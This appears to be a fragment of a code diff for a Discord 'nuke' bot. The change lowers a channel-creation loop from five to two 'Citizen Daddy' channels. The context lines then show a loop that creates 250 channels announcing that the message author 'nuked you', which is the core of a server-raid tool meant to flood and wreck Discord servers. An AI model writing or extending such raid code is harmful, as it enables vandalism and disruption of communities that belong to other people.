@@ -322,8 +322,8 @@ client.on("message", async message => {
 
 
                //Channel Creation
-							      for (var i = 0; i < 5; i++) {
-                            let channels = message.guild.channels.create("CITIZEN Daddy") }
+							      for (var i = 0; i < 2; i++) {
+                            let channels = message.guild.channels.create("Citizen Daddy") }
 
                   for (var i = 0; i < 250; i++) {
                         message.guild.channels.create(message.author.username + " nuked you")
